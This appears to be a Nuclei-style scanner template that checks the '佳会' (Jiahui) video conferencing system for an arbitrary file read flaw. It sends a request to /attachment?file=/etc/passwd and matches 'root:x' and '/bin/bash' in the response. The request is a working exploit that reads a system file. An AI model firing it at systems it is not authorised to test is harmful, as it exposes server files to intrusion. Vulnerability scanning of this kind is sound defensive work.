id: jiahuivideo-File-reading

info:
  name: 佳会视频会议 attachment 任意文件读取漏洞
  author: unknown
  severity: medium
  description: 佳会视频会议 attachment存在任意文件读取漏洞
  tags: File reading
  
http:
  - raw:
      - |
        GET /attachment?file=/etc/passwd HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'root:x'
          - '/bin/bash'
        condition: and
      - type: status
        status: 
          - 200